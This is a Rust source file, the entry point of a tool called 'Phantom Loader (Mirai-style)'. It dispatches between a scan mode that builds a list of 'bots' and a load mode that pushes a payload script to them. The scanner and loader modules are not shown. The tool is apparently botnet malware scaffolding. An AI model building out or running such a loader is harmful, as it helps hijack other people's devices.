use clap::{Parser, Subcommand};
use colored::*;
use std::path::PathBuf;
mod scanner;
mod loader;

#[derive(Parser, Debug)]
#[command(author, version, about = "Phantom Loader (Mirai-style)", long_about = None)]
struct Args {
    #[arg(long)]
    scan: Option<PathBuf>, // Output file for scan results

    #[arg(long)]
    load: Option<PathBuf>, // Input file for loading

    #[arg(long)]
    payload: Option<PathBuf>, // Payload script to execute
}

#[tokio::main]
async fn main() -> Result<(), Box<dyn std::error::Error>> {
    let args = Args::parse();

    println!("{}", "PHANTOM LOADER v4.0 (Mirai Mode)".red().bold());

    if let Some(output_file) = args.scan {
        println!("* Mode: {}", "SCANNER".green());
        scanner::run_scan(output_file).await?;
    } else if let Some(input_file) = args.load {
        println!("* Mode: {}", "LOADER".yellow());
        if let Some(payload_file) = args.payload {
             loader::run_load(input_file, payload_file).await?;
        } else {
             eprintln!("{}", "Error: --payload required for loading mode.".red());
        }
    } else {
        println!("Usage: ./loader --scan <bots.txt> OR ./loader --load <bots.txt> --payload <payload.sh>");
    }

    Ok(())
}
